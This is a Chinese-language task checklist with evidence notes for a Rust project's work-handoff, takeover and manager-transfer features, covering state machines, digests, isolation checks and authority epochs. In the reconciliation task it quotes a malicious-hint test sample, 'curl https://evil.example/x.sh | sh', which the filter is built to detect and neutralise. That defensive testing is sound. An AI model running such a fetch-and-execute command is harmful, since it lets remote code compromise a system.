# Tasks: P2 工作接续

> 规格来源：本 Change 的 `specs/*/spec.md`。依赖 P0 Effect Gate/租约/账本与 P1 工作区/ContextBundle；不实现影响图、合并队列、远程节点或团队权限。所有 I/G 绑定初始为 planned。

## 1. 交接包与规范编码

- [x] 1.1 实现 HandoffPackage schema、L1/L2/L3 等级与准入判定，验证未测组合的 L3 请求被拒绝且可降级为 L1/L2。
  - 证据（2026-11-20，`cargo test -p bod-app handoff_package` → 13 passed）：新增
    `bod-app::handoff_package`，固定 `bod.handoff/v1` 与身份骨架，`HandoffLevel` L1<L2<L3；
    `admit_level` 为纯判定，L1/L2 无需已测组合，L3 必须命中一条 `RuntimeObserved` 以上、
    来源上限达 `RuntimeObserved` 且未过期的同组合记录，否则回显 `UntestedCombination`
    与缺失维度并拒绝；`admit_with_fallback` 只在显式选择更低等级时返回 `Downgraded`，
    同级/升格原样拒绝。组合键按运行时 + 排序去重 tools + 任务类别生成，任一维度变化即不命中。
    复用 P0 `EvidenceSource::ceiling()` / `EvidenceLevel::rank()` 防自报与探测级证据冒充已测；
    决策类型无主体/命令/凭据/epoch，准入不授予管理权。详见 `docs/spec-notes/p2-handoff.md`。
  - 编号差异如实记录：tasks 把 I-46/I-47 分别写在 1.2/1.5，而 §39.10 权威语义不同，
    本切片不写 `gates.yaml`；P2 全部引用留到出口 5.3 统一补齐后再切 `BINDING_SOURCES`。
- [x] 1.2 实现规范编码与 payload_digest（摘要不递归计入自身）及原始字节摘要，验证跨语言测试向量得到一致结果（`invariant_i_46`）。
  - 证据（2026-11-20，`cargo test -p bod-app canonical_json` → 7 passed；`python
    verification/vectors/check_bod_canonical_json_v1.py` → PASS 14/14）：新增
    `bod-app::canonical_json`，固定 `bod-canonical-json-v1` 的 UTF-8/键序/整数字面量/
    数组保序/重复键/秒级 UTC 规则；`payload_digest` 只覆盖 `payload` 子对象且不纳入
    `integrity` 自身，`verify_envelope` 重算并区分 `DigestMismatch`、`MissingDigest`、
    `MalformedDigest`、`UnsupportedCanonicalization`；`material_integrity` 并列给出规范摘要
    与原始字节摘要，缩进与紧凑写法规范摘要相同、字节摘要不同。跨语言向量 14 条由 Rust 与
    独立 Python 校验器双方复算一致（含 `-0`/`1e3`/`1.5`/重复键/顶层非对象/孤立代理项的拒绝分类）。
    边界：不做 schema 必填与日历精确校验，不接受小数（金额须转整数最小单位）；
    I-46 仍不写 `gates.yaml`（P2 绑定保持 planned）。详见 `docs/spec-notes/p2-canonical.md`。
- [x] 1.3 实现宿主事实骨架与 Agent 叙述分栏、done 无证据保持 unverified，验证叙述不能覆盖账本或外部终态。
  - 证据（2026-11-20，`cargo test -p bod-app handoff_facts` → 10 passed）：新增
    `bod-app::handoff_facts`，输入分成 `HostFactsInput`（工作区/成果/验证/Effect/预算）与
    `NarrativeInput`（摘要/失败原因/建议/自称 done/自称证据/自称 Effect 状态）两组，
    叙述结构上没有宿主字段的写入路径；`assemble` 原样复制宿主字段，完成度只按目标修订的
    宿主验证记录推导（无成果/无验证/被拒/全自报/无证据引用分别对应固定原因），
    `claimed_done` 不参与判定；自称 done 无证据 → `Unverified` 且宿主仍 `Incomplete`，
    自称 Effect 状态与宿主不同 → 宿主状态不变并记 `EffectStateOverride`；payload 复用 1.2
    规范编码求摘要，冲突列表为派生视图不写入 payload。边界：不持久化、不判定接续、不校验授权；
    §39.10 把 I-46 映射到 `manager_transfer`（3.x 才有），本切片用例仅作支撑证据，
    不写 `gates.yaml`。详见 `docs/spec-notes/p2-facts.md`。
- [x] 1.4 实现部分快照（missing/来源/完整性状态）与版本/snapshot_seq 绑定，验证崩溃样本可登记且无关元数据变化不触发失效。
  - 证据（2026-11-20，`cargo test -p bod-app handoff_snapshot` → 14 passed）：新增
    `bod-app::handoff_snapshot` 与迁移 `007_handoff.sql`（`handoff_snapshots`，只建表建索引）。
    `CaptureSource` 区分正常交接与三种尽力快照；`MissingPart` 强制带原因（未捕获/捕获失败/
    不可导出/已过滤）；`IntegrityStatus` 中只有 `verified` 算完整，`unverified` 不算通过；
    `Completeness` 由缺项与片段核验状态派生，payload 摘要只从已核验的 `payload` 片段报告。
    登记用文件型 SQLite 实测：崩溃样本关开后读回一致；同键同内容幂等（行数仍 1、登记时间不变），
    同键不同内容报 `SnapshotKeyConflict` 且不覆盖既有现场；冗余 `completeness` 被改则 `CorruptRow`。
    `evaluate_binding` 只比 input/work_package/scene revision 与 `snapshot_seq`：三者变化才 `Drifted`
    并使工作失效，序号前进为 `Superseded`（不失效），序号倒退直接报错不猜；标题/标签/评论数/
    更新时间只进 `metadata_changes`，实测四条全列出仍判 `Current`。迁移计数断言同步 6→7、37→38。
    边界：不判定接续、不做凭据过滤、不接工作台、不写第二业务库；不新增 `gates.yaml` 条目
    （P2 绑定仍 planned，`invariant_i_47` 属 1.5）。详见 `docs/spec-notes/p2-snapshot.md`。
- [x] 1.5 实现现场清单边界（submodule/LFS/锁文件/冲突/密钥过滤）与交接事件类型，验证 `invariant_i_47`：包内无凭据值，重复 accept 返回同一结果。
  - 证据（2026-11-20，`cargo test -p bod-app handoff_manifest` → 14 passed；`cargo test -p bod-app handoff_event` → 17 passed）：新增 `bod-app::handoff_manifest`，条目分 tracked_file / submodule / lfs_pointer / lock_file / toolchain_pin / required_service / unresolved_conflict / external_session_state 八类；`ContentState` 把「字节在包内」「只有指针」「按授权引用」「已脱敏」「未导出」「清单级声明」分开，`content_digest()` 只从 `included` 报告，因此「摘要存在 ≠ 内容可恢复」是类型后果（`pointer` 的 oid 不进内容摘要）；过滤顺序固定为客户资料前缀 → 凭据命中 → 大小上限 → 内联，客户资料与凭据脱敏原因分开。凭据只经 `add_credential_env` 立刻转成 `SecretRef`（名称 + 可复算摘要），清单结构里没有存放值的字段，含凭据的文件与锁文件整条脱敏、冲突说明替换为 `<redacted:NAME>`，`audit_for_secret_values` 对空候选如实报 `empty` 而不是通过。
    新增 `bod-app::handoff_event` 与迁移 `008_handoff_events.sql`（`handoff_events` + `handoff_acceptances`，只建表建索引）：六类事件按状态机折叠，`seq` 连续且读回重放校验，`blocked` 必带原因、`captured/validated/accepted` 必带快照引用；能力表规定 agent 只能 `requested/captured` 且 attempt 必须等于来源 attempt（越权 `CapabilityRequired` 与越界 `OutOfScope` 分开报），宿主可 `captured/validated/resumed`，策略仅 `blocked`，人可全部。accept 幂等由 `(company_id, handoff_id)` 主键保证：一个交接只能被接受一次，重复同键同内容返回同一 `acceptance_key`/`accepted_seq`/`accepted_event_id`，同键不同内容报 `IdempotencyKeyReuse`，不同键报 `AlreadyAccepted`；接受前要求状态为 `validated` 且快照已登记，接受不创建 Attempt/队列/租约（实测 `invocations` 与快照行数不变），读回路径用接受行里的来源补写缺失事件而不伪造「replayed 用户」。
    迁移条数断言 7→8、表计数断言 38→40 同步。边界：不读网络与真实工作区、不判定接续、不新增 `gates.yaml` 条目（P2 绑定仍 planned，`invariant_i_47` 的 tasks 编号与 §39.10 权威语义差异延续 1.1 的记录）。详见 `docs/spec-notes/p2-manifest.md`。

## 2. 接管事务

- [x] 2.1 实现持久交接意图与分阶段状态机、expected_version 条件提交，验证等待总结期间重启不重复请求或创建 Attempt。
  - 证据（2026-11-20，`cargo test -p bod-app takeover_intent` → 14 passed）：新增
    `bod-app::takeover_intent` 与迁移 `009_takeover.sql`（`takeover_intents`，只建表建索引）。
    意图按 `(company_id, takeover_key)` 幂等开单：同键同内容 `AlreadyOpen` 且保留第一次创建时间，
    同键不同内容 `IntentConflict`。阶段按 §19.1 八阶段推进并额外区分 `awaiting_summary`
    与 `aborted`，任何非终态可中止但必须给原因；每次推进写一条 `{phase, at, note}` 历史，
    读回时要求历史末条与阶段列一致，手工改库伪装阶段报 `CorruptRow`。
    「等待总结」是持久状态而非事务：`request_summary` 只写请求与阶段，宿主在事务外等 Agent；
    实测请求后丢弃内存态、从存储重载仍为 `awaiting_summary`，重复请求读回第一次时间且不推进版本
    不追加历史，`attempt` 为 `None`、`invocations` 为 0、意图仍 1 条。
    所有写入走 `UPDATE ... WHERE version = expected` 条件提交，受影响 0 行即 `VersionConflict`
    并保留先写者结果；同阶段重复提交返回 `Unchanged` 不刷假历史。进入 `attempt_created` 必须
    带 `AttemptCreation`，给了旧 token 时新 token 必须严格更大，但意图层只登记不创建 Attempt
    （实测 `invocations`/`acceptances` 均为 0）。迁移条数断言 8→9、表计数 40→41。
    边界：不判断旧执行是否真停（2.2）、不对账（2.3）、不预检（2.4）、不写 `gates.yaml`
    （P2 绑定仍 planned）。详见 `docs/spec-notes/p2-takeover.md` §1。
- [x] 2.2 实现旧执行停止确认与隔离检查，验证 `invariant_i_48`：旧写入未停时新执行者写同一现场被拒绝，允许独立无冲突工作。
  - 证据（2026-11-20，`cargo test -p bod-app isolation_check` → 21 passed（原记 22 为子串过滤误计，见 `docs/spec-notes/p2-takeover.md` §6.1）；`cargo test -p bod-app
    takeover_intent` → 17 passed）：新增 `bod-app::isolation_check`，不建新表——判定输入全部来自
    已持久化事实（取消事件、执行终态、权限/租约记录），避免与取消账本形成两个事实源。
    `StopStatus` 四态只有 `Confirmed` 携带证据，且只能经 `from_cancel_event` 从 P1 4.3 的
    `CancelEvent` 派生：实测 `request_cancel → record_cancel_ack` 后 `stop_confirmed=false`、
    `stop_evidence=None`、`clearable=false`，补 `confirm_stop(ExecutionState::Cancelled)` 后才为真。
    `SurfaceKnowledge` 三态（枚举/仅根/未知）按路径**组件**比较，`/ws/src` 与 `/ws/src2/a.rs` 判为
    不相交；统一分隔符与大小写、词法消解 `..`；空枚举在 `validate` 拒绝且关系兜底为 `Indeterminate`，
    防止「枚举了但没东西」变成放行一切；未知面一律阻断。`IsolationBasis` 只有环境销毁 / 写权限
    撤销 / 所有权移交三类且必须带引用，空引用 `UnevidencedBasis`、同类重复 `DuplicateBasis`，
    刻意不提供「这是独立工作区」这类自述依据。判定表：写同一现场要求停止确认**且**已隔离；独立
    路径只要求已隔离（停止状态不参与，否则「允许独立无冲突工作」不成立）；未知面任何证据都不放行。
    `EffectSurface` 与写入面分开建模，相关动作在停止未确认时两入口（`decide_effect` 与
    `decide_write` 的 `effect_key`）都拒绝重发，`required_evidence` 指向停止确认或 2.3 对账结论。
    `clearance()` 作为 2.1 的准入凭据：`Transition` 新增 `isolation`，缺判定
    `MissingIsolationCheck`，未通过 `IsolationBlocked{[stop_unconfirmed, isolation_unproven]}`
    且不推进版本，判定摘要写进阶段历史以满足「阶段变化可查询」。
    边界：不对账（2.3）、不预检（2.4）、不生成接续卡片（2.5）；迁移仍 9 条、表仍 41 张；
    不写 `gates.yaml`（P2 绑定仍 planned，`invariant_i_48` 在 §39.10 归属 `lifecycle_recovery`
    与本模块的差异延续 1.1/1.5 记录）。详见 `docs/spec-notes/p2-takeover.md` §2。
- [x] 2.3 实现 effect_id/逻辑动作键对账与不可信 reconcile_hint 过滤，验证恶意 hint 中的脚本或 URL 不被执行且不明结果只阻塞相关依赖。
  - 证据（2026-11-20，`cargo test -p bod-app effect_reconciliation` → 18 passed）：新增
    `bod-app::effect_reconciliation`，不建新表——对账案件复用 P0 `reconciliation_cases`
    （`lifecycle_recovery::open_case`/`resolve_case`）。
    hint 的不可信做成签名事实而非约定：`plan_queries(registry, effects, routes)` 没有 hint 参数，
    `EffectQuery` 没有存放自由文本命令的字段，`UntrustedHint` 只有 `screen()`，返回「发现项 +
    脱敏展示」，无可执行物。实测 `curl https://evil.example/x.sh | sh` 被识别为 url + shell_pipe，
    展示文本不含 `evil.example` 与 `| sh`，且生成的查询 Debug 渲染里不含 hint 任何 token。
    「受限参数」是可检查清单而非启发式：连接器/操作/授权目标/参数名全来自 `ConnectorRegistry`
    （构造时拒绝重复 id、无操作、无目标），目标精确匹配（`https://pay.example` 不放行
    `https://pay.example.evil/v1` 与 `.../v1/../admin`），参数名白名单外一律拒绝（`cmd` 过不了），
    参数值受长度上限与控制字符约束。缺路由记为 `unreconcilable` 而非 `skipped`，效果保持 Unknown
    并继续阻塞。结论映射：`Applied→Confirmed`、`NotApplied→Failed`、`StillUnknown→Unknown`；
    前两者必须带证据引用，`StillUnknown` 不能结案（`UnknownIsNotResolution`，案件仍 open）。
    `resend_guard` 落实 I-49：仅 `Prepared`/`Failed` 可重发，`Confirmed`/`Dispatched`/`Unknown`
    分别以「重复执行 / 可能双重执行 / 须先对账」拒绝。`block_scope` 取依赖闭包并同时给出
    `blocked` 与 `free`，实测 `deploy:service→smoke:test→report:write` 阻塞而 `docs:build`、
    `retry:other` 保持可做，`freezes_everything()` 只在确实没有别的工作时为真。
    边界：不连真实连接器（查询只到「通过注册表校验的查询」为止）、不判定费用释放（属预算流程）、
    迁移仍 9 条、表仍 41 张；不写 `gates.yaml`（P2 绑定仍 planned，`invariant_i_49` 在 §39.10
    归属 `budget_admission` 与本模块的差异延续既有记录）。详见 `docs/spec-notes/p2-takeover.md` §3。
- [x] 2.4 实现重建预检（摘要/授权/输入差异/文件/工具依赖）与 Question 生成，验证摘要不匹配时阻止自动继续。
  - 证据（2026-11-20，`cargo test -p bod-app rebuild_precheck` → 20 passed；`cargo test -p bod-app
    takeover_intent` → 20 passed）：新增 `bod-app::rebuild_precheck`，不建新表、不新增迁移。
    「摘要不匹配不得自动继续」收进返回类型：`next_action()` 在 `Blocked` 时只返回
    `Err(RemedyRequired)`，选措施后也只给 `Recapture`/`Manual` 两种动作，`Rebuild` 仅在无阻塞且
    无待答问题时出现；`resolve()` 拒绝在 `Ready`（`NothingToResolve`）与 `NeedsAnswer`
    （`RemedyNotApplicable`）时选措施，重复选择报 `RemedyAlreadyChosen`。
    比较只覆盖 `ContentState::Included`（`Match`/`Mismatch`/`Missing`/`Unreadable`），指针、按授权
    引用、脱敏、未导出一律进 `unverified` 而不是「通过」；差异说明只给路径与摘要前 12 位，不含内容。
    首次实现把 `RequiredService`（`postgres://…` 含冒号）与 `ToolchainPin` 当文件比对，测试实测
    报 `InvalidPath` 与误报 `file_missing`——已修正为「标识符条目按工具版本/服务可达性核验」，
    两类都不进 `unverified`；`UnresolvedConflict` 单独阻断。
    忽略规则只作用于清单外文件：额外文件被忽略后 `Ready`，清单内文件命中同一前缀仍照常比对并阻断
    （`ignored` 为空），防止用前缀掩盖篡改；未忽略的额外文件形成 `UnexpectedFile` Question
    （保留/删除后重取/加入忽略，`blocked_items` 只含该路径，`all_attempt=false`），系统不自动删除。
    授权只接受宿主 `Authorization`（epoch + scope + 撤销），包内 `HandoffLevel` 无转换路径；旧 epoch、
    已撤销、范围不含分别阻断，`Referenced` 条目的引用名同走 scope 判定。
    预检运行只接受已登记命令引用（字符集受限，空格/管道/分号拒绝），`NotRun` 不计通过，声明必需的
    类型无 `Passed` 报 `required_precheck_missing`，失败报 `precheck_failed` 并带证据引用。
    目标理解三取值且 `is_candidate_only()` 恒真——「宿主自动判定一致」在类型里无法表达；歧义/冲突
    必须给分歧点并转成 P1 `clarification_dialogue::ClarificationQuestion`，责任方取自
    `question_owner`（空值拒绝），不由 Agent 填写。
    接入 2.1：`Transition` 新增 `precheck`，进入 `Restored` 缺凭据报 `MissingPrecheck`（意图停在
    `attempt_created`），attempt_id 或 input_revision 不符报 `PrecheckMismatch`，通过时把
    「已核验 N 项 / 未核验 M 项」写进阶段历史。边界：不读写真实工作区、不执行命令、不生成接续卡片
    （2.5）、不写 `gates.yaml`（P2 绑定仍 planned）。详见 `docs/spec-notes/p2-takeover.md` §4。
- [x] 2.5 实现接续可见性卡片（等级/保留成果/missing/停止状态/重建步骤），验证换人不改变验收或合并旧未验收成果。
  - 证据（2026-11-20，`cargo test -p bod-app continuation_card` → 18 passed）：新增
    `bod-app::continuation_card`，纯只读投影，不建表、不新增迁移（仍 9 条 / 41 张表），
    不持 `SqliteStore`、不接受成果、不产生命令。
    五个分区齐全：等级取自 1.1 的 `AdmissionDecision`（降级时显示获批等级与缺失维度，摘要行不出现
    请求等级）、保留成果只来自宿主 `AcceptanceRecord`、缺失取自 1.4 快照并保留原因码、停止状态照抄
    2.2 的四态、步骤来自 2.4 的 `REBUILD_STEPS` 与报告完成标记（无报告 0/8，就绪报告 6/8——只读与
    测试预检未跑、继续执行未发生）。
    「不把旧候选标为已接受」做成类型事实：`PreservedArtifact` 字段私有且唯一入口 `from_record`，
    与 `CandidateArtifact` 无互转路径；候选自带 `accepted: true` 只作原始声明，无对应接受记录时记
    `discrepancies` 并保持未接受。`ack_only` 不渲染成「已停止」（文案为「未证实停止——不得据此写
    旧现场」），隔离未检查为 `not_checked` 且 `writable = None` 而非 `true`；写判定调 2.2
    `decide_write`，驳回时列出隔离条件。
    权限原样回显：`AuthorityView` 只拷贝观察者 scope，L1 与 L3 卡片的 authority 完全相等（用例固定），
    卡片无 `can_accept`/`can_resume` 之类的授权位。「换人不改变验收」由 `manager_change_...` 用例
    固定：换观察者后保留成果逐字段相等，验收人仍是原验收人。
    实测抓到的真问题：首版用 `record.approves(work_package_revision)` 判定，`preserved` 恒为空——
    `AcceptanceBinding::binds()` 比的是 **artifact revision** 而非工作包修订；改为按绑定的
    `work_package_revision` 判定，历史接受单列 `stale_acceptances`（`requires_human` /
    `superseded` / `work_package_mismatch`），既不并入保留也不静默丢弃。
    边界：不渲染视觉样式、不判断能否接续（2.4 结论）、不做跨修订等价推断、不写 `gates.yaml`
    （P2 绑定仍 planned）。详见 `docs/spec-notes/p2-takeover.md` §5。
- [x] 2.6 编写接管事务与故障样本说明到 `docs/spec-notes/p2-takeover.md`，验证每个阶段对应 scenario 与可注入故障点。
  - 证据（2026-11-20，文档 + 机械核对，无代码改动）：`docs/spec-notes/p2-takeover.md` 新增 §6，
    含四张表——（1）十一个阶段（含 `aborted`）的进入门禁、拒绝样本、覆盖用例与可注入故障点，门禁
    逐条取自 `check_transition` 的真实分支（`SummaryNotRequested`/`MissingSummarySnapshot`/
    `MissingIsolationCheck`/`IsolationBlocked`/`MissingAttempt`/`FencingNotIncreased`/
    `MissingPrecheck`/`PrecheckMismatch`/`MissingAbortReason`/`TerminalPhase`/`VersionConflict`）；
    （2）P2 十二项需求 → 场景 → 模块 → 用例；（3）22 行故障注入矩阵，每行的「注入方式」都是测试里
    真做过的那一步（如「同一 expected_version 连续提交」「删中间 seq 行后重载」「hint 写 `curl … | sh`」）；
    （4）未覆盖项清单（真实进程停止、真实丢回包、旧经理并发切换、B 不可用、预算耗尽交接、
    `captured` 无快照门禁、桌面 conformance），逐项标出归属切片，不假装覆盖。
    核对方式：§6 引用的 61 个用例名逐一与 `cargo test -p bod-app --lib -- --list`（422 项）比对，
    全部存在；其余标识符（错误码、字段名、阶段名）逐个 grep 命中源码。核对中发现两处不一致并如实
    记录：① `captured` 阶段只有顺序门禁、没有 `summary_snapshot_key` 那样的快照引用要求，补门禁会改
    2.1 的 `Transition` 接口，留作 5.1 前待定项；② 2.2 记录的「22 passed」实为
    `cargo test isolation_check` 子串过滤把 `takeover_intent::isolation_checked_requires_a_check_result`
    一起计入，模块实为 21 条，已在 tasks 与 §2.7 更正并写入 §6.1。
    边界：不新增代码、不改门禁、不写 `gates.yaml`（P2 绑定仍 planned）。

## 3. 负责人切换

- [x] 3.1 实现 Appointment/authority_epoch/scope/命令集/audience 绑定与当前状态复核，验证 `invariant_i_58`：旧 epoch 管理命令被拒且缓存可失效。
  - 证据（2026-11-20，`cargo test -p bod-app manager_transfer` → 23 passed）：新增
    `bod-app::manager_transfer` 与迁移 `010_management.sql`（`management_appointments`、
    `management_scope_heads`、`management_commands`；41 → 44 张表，9 → 10 条迁移，
    `migration_safety` 与表数断言同步）。
    `invariant_i_58` 落在库层而不靠先查后写：`management_appointments` 上的部分唯一索引
    `(company_id, scope_key) WHERE status = 'active'` 直接挡住第二个在任委任，
    `UNIQUE (company_id, scope_key, authority_epoch)` 挡住 epoch 复用（用例直接插两行验证，
    不经业务代码）；epoch 由宿主按头指针 +1 分配，`AppointRequest` 里没有 epoch 字段，Agent
    无从自选；每代租约为 1 → 3 → 5（撤任本身也占一格，让旧票当场失效），历史严格递增。
    「旧 epoch 命令被拒」：撤任先推头 epoch+version 再改状态行，第二步失败也 fail closed；
    复核按 `ticket.authority_epoch` 与头 epoch 比较，低报 `stale_appointment`、高于当前报
    `unknown_epoch`（宿主不签发未来 epoch）。拒绝写 `management_commands` 审计行（原因码 +
    说明 + 当前 epoch），可读回。
    「缓存可失效」：条目带 `head_version`，每次提交仍读一次权威头行（`CacheStats.head_reads`
    可观测）；用例断言命中后 `head_reads == 2`，撤任后旧票被拒且 `hits` 不增、`reloads` 增加；
    `invalidate(scope)` 删除条目（二次返回 false），缓存条目数上限 16，超限整体清空并计数。
    凭据绑定：appointment/epoch/scope/命令集/受众/时效；`not_after - issued_at > 900s` 报
    `LongLivedCredential`，过期/未生效/有效期超出委任到期分别拒绝；票证无 invocation/assignment
    字段，`purpose()` 恒为 Management，不能当执行凭据；治理命令（任命/撤任）在构造命令集时即
    `GovernanceCommandNotGrantable`。命令键幂等：同键同语义返回原结果且不写第二条审计，同键
    不同参数报 `CommandKeyReuse`。
    实测修正两处设计误判：① 撤任后头 epoch 领先委任行是正常态，首版按「必须相等」判
    `CorruptScopeHead`；② epoch 序列因撤任也占一格，预期 1/3/4 实为 1/3/5。另记录两处保守取舍：
    暂停不递增 epoch（每条命令重查状态），暂停期间不能直接换人——原子「结束旧委任 + 切指针 +
    新 epoch」属 3.3，不用近似做法代替。边界：不实现切换流程、员工继续、历史成果与费用、专项
    边界；不写 `gates.yaml`（P2 绑定仍 planned）。详见 `docs/spec-notes/p2-manager-transfer.md` §1。
- [x] 3.2 实现员工独立继续与执行/管理身份分离，验证切换时运行任务继续、已接受成果不重做，旧经理执行身份上传的合法成果保留（`invariant_i_59`）。
  - 证据（2026-11-20，`cargo test -p bod-app staff_continuation` → 19 passed）：新增
    `bod-app::staff_continuation`，只读投影不建表（迁移仍 10 条、表仍 44 张，沿用 2.5 的做法），
    事实来源是 issues / runs / invocations / artifacts / artifact_revisions / acceptances。
    身份分离做成两条互不推导的来源：执行座位只能由 `ExecutionSeat::from_issue`（Issue 的
    Assignment）构造，签名里没有 Appointment 参数；管理身份只来自 3.1 的当前委任，
    `role_of().holds_management()` 仅在 `Active` 时为真。双向顶替都没有代码路径：
    `management_ticket_as_execution()` 恒 `ManagementIsNotExecution`，
    `ExecutionCredential::as_management_ticket()` 恒 `ExecutionIsNotManagement`；执行凭据只有
    `for_invocation` 入口，attempt 与 fencing token 取自持久化记录。
    「切换不停止员工」是类型事实：`Directive` 只有 Continue / Preserve / Retain /
    RebuildViaHandoff / ResolveBeforeSwitch，没有 Cancel/Stop/Restart/Redo（用例逐个断言缺席），
    因此切换期的重做/重启/改派请求只能被拒（`RedoAccepted` / `RestartRunning` or
    `RestartBlocked` / `ExecutorLockedWhileRunning`）。
    「已接受成果不重做」= 未被取代 + `decision.is_accepted()` + 接受指针指向该修订，三者缺一进
    `stale_acceptances`（单列可数，不并入保留也不静默丢弃）；贡献只从保留的接受所绑定修订推导，
    `produced_by` 一次 join 查出，接受指向缺失修订报 `CorruptAcceptance` 而不跳过。
    旧经理兼任执行按 §19.10 分支：只有宿主显式声明 `Separable` 才 `Continue`（保留 Assignment、
    只移除管理能力），`Undeclared`/`NotSeparable`/座位未登记一律 `RebuildViaHandoff` 并指向
    2.2/2.4/2.5，本模块不自己停进程；声明必须命中真实座位、不许重复，缺省不当可分离。
    `Cancelling`/`Unknown` 只产出 `ResolveBeforeSwitch`（分别指向停止确认与对账），`may_restart`
    对两者都拒绝，避免双重执行。
    实测：A→B 切换（撤任 epoch 1→2、任命 B 为 epoch 3）后 running/accepted/contributions 逐字段
    相等、计划 items 逐条相等、invocation 仍 Running、接受行未增删；旧票提交返回
    `StaleAppointment`；员工项的指令与 `outgoing` 无关（另按 `manager-z` 求计划比对）。
    边界：不做切换事务（3.3）、不改历史接受与费用（3.4）、专项子树作用域显式拒绝并指向 3.5；
    不写 `gates.yaml`（P2 绑定仍 planned，`invariant_i_59` 的 tasks 编号与 §39.10 权威语义差异
    延续 1.1/1.5/2.2/2.3 的记录）。另修一处既有门禁缺口：`xtask migration-check` 的
    `MIGRATION_TABLES` 只登记到 006，P2 前几片新增的 007—010 从未登记，补齐后
    `[migration-check] PASS 10 个迁移脚本含 44 张必需表且无破坏性 DDL`。
    详见 `docs/spec-notes/p2-manager-transfer.md` §2。
- [x] 3.3 实现检查点增量读取与接管确认事务，验证只读确认不产生管理权、确认后命令仍逐条校验当前委任（`invariant_i_60`、G-42）。
  - 证据（2026-11-20，`cargo test -p bod-app takeover_review` → 14 passed）：新增
    `bod-app::takeover_review` 与迁移 `011_handover_review.sql`（`handover_checkpoints`、
    `takeover_confirmations`），迁移 10 → 11、表 44 → 46，`xtask migration-check` 同步登记。
    检查点只存 `(kind, id, fingerprint)`，覆盖 issue / run / invocation / artifact / revision /
    acceptance / snapshot 七类事实；游标 = 对排序后的 `kind\tid\tfingerprint` 文本求 sha256，
    只覆盖事实不覆盖缺口（否则「补了一份快照」会把同一份事实算成另一个现场）。读回时重算游标并
    核对 `item_count`（`CorruptCheckpoint`），指纹含分隔符报 `CorruptFingerprint`，超 8192 项报错
    而不截断。同 scope 同游标重复捕获落回同一行，且不覆盖第一次的捕获人与时间。
    增量分 `added` / `changed` / `vanished` 三类（消失项必须报出，不当作已处理），
    `is_empty()` 只看事实，缺口单独查询：`missing_snapshot`（在跑的执行没有交接快照，即
    「无旧经理总结」）、`partial_snapshot`（回显 missing_json）、`unreconciled_execution`
    （Unknown/Cancelling，指向 2.2/2.3）、`open_acceptance`（RequiresHuman，指向 2.5）。
    接管确认在同一 `BEGIN IMMEDIATE` 事务里读作用域头、委任行、检查点行再插确认行：无头
    `NoActiveAppointment`、非当前指针或 epoch 不符 `StaleAppointment`、状态非 Active
    `AppointmentInactive`、确认人不是 `manager_agent_id` `ConfirmerIsNotManager`、游标不符
    `CursorMismatch`、跨作用域 `CheckpointScopeMismatch`；同 `confirmation_id` 同内容幂等返回原行，
    不同内容 `ConfirmationKeyReuse`。
    「只读确认不产生管理权」做成类型事实：`confirmation_as_ticket` 恒返回
    `ConfirmationIsNotAuthority`（与 3.2 的 `management_ticket_as_execution` 同口径），实测确认后
    委任行数仍 1、epoch 仍 1、头指针未改写；未受委任的人仍可只读核对（I-65 不依赖旧经理在线）。
    确认状态随 epoch 走：`never_confirmed` / `current` / `blocked` / `superseded`，
    撤任后确认自动降级为 `Superseded{1,2}`，新经理在 epoch 3 确认后回到 `current`；
    同一 epoch 内 `blocked` 之后可再 `confirmed`（历史两条都留）；`blocked` 必须写理由。
    确认后命令仍逐条复核：epoch 1 提交 `AssignTask` 通过，撤任 A + 任命 B（epoch 3）后同一条旧票
    返回 `StaleAppointment`。确认行记录 `checkpoint_cursor` 与 `reviewed_cursor`，两者不同即
    「确认时现场已前进」，并留下当时的缺口与增量计数。
    边界：不做整次换人的原子事务（双人并发切换属 G-38 / 5.1）、不改历史成果与费用（3.4）、
    专项子树作用域显式拒绝并指向 3.5；`blocked` 不回写成准入门禁，避免第二套授权判断；
    不写 `gates.yaml`（P2 绑定仍 planned）。
    编号差异如实记录：tasks 把 `invariant_i_60` 挂在本任务上，但 §39.11 的 I-60 是「未委任普通
    执行者只能反馈，受委任负责人在 Grant 内可安排工作」，检查点增量与接管资料的权威编号是
    **I-65** 与 **G-42**；本切片按 I-65 + G-42 落地，不宣称 I-60 已验收。
    详见 `docs/spec-notes/p2-manager-transfer.md` §3。
- [x] 3.4 实现历史成果/费用不可变与争议待核查标记，验证 `invariant_i_61`：新经理不能追溯修改旧接受或费用主体。
  - 证据（2026-11-20，`cargo test -p bod-app history_continuity` → 21 passed）：新增
    `bod-app::history_continuity` 与迁移 `012_history_disputes.sql`（`history_disputes`），
    迁移 11 → 12、表 46 → 47，`xtask migration-check` 同步登记。
    责任分三段：**阻止**靠数据库（012 新增 `acceptances_binding_immutable` 与
    `acceptances_supersede_monotonic`，账本/修订沿用 003/005 的 no_update/no_delete），
    **发现**靠 `HistoryView::capture` + `compare` 对 artifact / revision / manifest /
    acceptance / ledger / decision 六类事实求指纹与 sha256 游标，**表达异议**靠
    `history_disputes` 只写一行 `under_review`。
    内容指纹与前进指针分开：`accepted_revision` 与 `superseded_by` 的 `None → Some` 算正常前进，
    `Some → None` / `Some(A) → Some(B)` 判回退并报 `RewindFact`；新增事实只进 `appended`，
    所以「换人后正常产出」不会被误判成篡改，而「改一条旧行」与「删一条旧行」分别报
    `altered` / `vanished`，实测删除旧决定报 `HistoryRewritten{vanished:1}` 而不是当作已清理。
    追溯请求只有一个成功出口：`ReverifyAccepted` 返回 `PreserveThenPropose{preserved,
    requirement: "p3-impact-reverification"}`（保留旧接受、提案属 P3 2.3，本切片不建第二套重验流程），
    `RewriteAcceptance` / `ReassignFeeSubject` / `DeleteHistory` 分别恒错
    `AcceptanceIsImmutable` / `FeeSubjectIsImmutable` / `HistoryIsAppendOnly`。
    争议行冻结对象与理由、已结案不能改判或重开、行不可删除（三条 trigger）；`raise` 要求
    理由与证据且对象必须存在，同 `dispute_id` 同内容幂等、不同内容 `DisputeKeyReuse`；
    `resolve` 用 `WHERE state='under_review'` 条件更新，并发只有一个成功；推翻只返回
    `FollowUp`（指向 P3 提案），旧接受一字不改；`check_drift` 对「争议期间对象被改动」报
    `FactDriftSinceCapture`；`dispute_as_ticket` 恒返回 `DisputeIsNotAuthority`。
    核对中发现两处既有缺口并如实记录、未顺手改：005 的 `acceptances_immutable` 只冻结
    id/修订/结论/主体/时间，五元组其余字段与理由/证据仍可 UPDATE（本切片以新增 trigger 补齐，
    不改写 005 历史定义）；`decisions` 表没有任何不可变约束，本切片只能发现、不能阻止，
    是否冻结留给后续切片。详见 `docs/spec-notes/p2-manager-transfer.md` §4。
